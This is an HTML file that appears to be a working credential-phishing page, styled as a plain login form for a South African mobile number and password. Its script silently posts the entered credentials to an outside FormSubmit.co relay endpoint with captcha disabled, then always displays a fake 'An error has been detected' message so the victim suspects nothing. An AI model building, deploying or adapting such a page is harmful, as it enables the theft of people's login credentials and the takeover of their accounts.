<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      margin: 0;
      padding: 0;
    }

    .page {
      display: none;
    }

    .page.active {
      display: block;
    }

    .container {
      max-width: 400px;
      margin: 80px auto;
      background-color: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }

    h2 {
      text-align: center;
    }

    input[type="tel"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      margin-bottom: 20px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button[type="submit"] {
      width: 100%;
      background-color: #2e8b57;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    .error-message {
      color: #cc0000;
      font-size: 22px;
      font-weight: bold;
      text-align: center;
      padding: 40px;
    }
  </style>
</head>
<body>

  <!-- Login Form Page -->
  <div class="page active" id="form-page">
    <div class="container">
      <h2>Login</h2>
      <form id="login-form">
        <!-- These hidden fields go to FormSubmit -->
        <input type="hidden" name="_captcha" value="false" />

        <label for="mobile">Mobile Number</label>
        <input type="tel" id="mobile" name="mobileNumber" placeholder="+27 Mobile Number" required />

        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Password" required />

        <div><a href="#">Forgot Password?</a></div>

        <button type="submit">Login</button>
      </form>
    </div>
  </div>

  <!-- Error Page -->
  <div class="page" id="error-page">
    <div class="container">
      <div class="error-message">
        An error has been detected, please try again later.
      </div>
    </div>
  </div>

  <script>
    const form = document.getElementById('login-form');

    form.addEventListener('submit', async function (e) {
      e.preventDefault();

      const formData = new FormData(form);

      try {
        await fetch("https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21", {
          method: "POST",
          body: formData
        });

        // Show error page after submission
        document.getElementById('form-page').classList.remove('active');
        document.getElementById('error-page').classList.add('active');

      } catch (err) {
        // Also show error page if something goes wrong
        document.getElementById('form-page').classList.remove('active');
        document.getElementById('error-page').classList.add('active');
      }
    });
  </script>
</body>
</html>
